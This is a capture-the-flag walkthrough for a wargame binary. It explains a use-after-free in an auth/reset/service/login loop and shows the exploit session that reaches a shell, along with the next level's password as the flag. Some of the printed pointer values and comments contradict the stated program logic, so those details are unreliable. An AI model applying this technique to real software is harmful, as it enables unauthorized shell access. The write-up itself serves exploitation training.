# Level 8 Walkthrough

## Binary Overview

This binary runs a loop that reads user input and responds to four commands: `auth`, `reset`, `service`, and `login`.
There are two global variables: `auth` and `service`, both of which are pointers to `char`. When you use the `auth` or
`service` command, memory is allocated on the heap, filled with a string, and the pointer is stored in the respective
global variable. The condition to execute the shell is that `(auth + 0x20) != 0`.

## Command Parser Recap
At startup the program prints the contents of two global pointers (`service`, `auth`) and then loops:
```c
printf("%p, %p\n", service, auth);
fgets(buf, 0x80, stdin);

if (strncmp(buf, "auth ", 5) == 0) {
    auth = malloc(4);
    bzero(auth, 4);
    if (strlen(buf+5) <= 0x1e)
        strcpy(auth, buf+5);
}

if (strncmp(buf, "reset", 5) == 0)
    free(auth);                                 // auth pointer NOT cleared

if (strncmp(buf, "service", 7) == 0)
    service = strdup(buf+7);                    // unbounded copy

if (strncmp(buf, "login", 5) == 0) {
    if (*(auth + 0x20))
        system("/bin/sh");                      // win condition
    else
        fwrite("Password:\n", 1, 10, stdout);
}
```

## Vulnerability
- `auth` points to a 4-byte allocation, yet later the program reads `*(auth + 0x20)`.
- `reset` frees the chunk but leaves `auth` pointing to the freed memory (dangling pointer).
- `service` performs `strdup` with no length limit. When the freed chunk is reused, we can populate it with >32 bytes,
ensuring the `login` check sees a non-zero value beyond offset 0x20.

## Exploit Steps
```
$ ./level8
(nil), (nil)
auth a
0x804a008, (nil)
reset
0x804a008, (nil)         # pointer still printed, but chunk freed
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018     # strdup reused the same region
login
$ id
uid=2008(level8) gid=2008(level8) euid=2009(level9) ...
```
The long `service` string (anything > 0x20 bytes) makes `*(auth + 0x20)` non-zero, so `login` executes
`system("/bin/sh")`.

## Flag
```bash
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## Notes
- Because the pointers are printed each loop, it is easy to confirm that the freed chunk is being reused.
- No heap grooming is necessary on the target VM; the next `malloc` consistently reuses the old address.

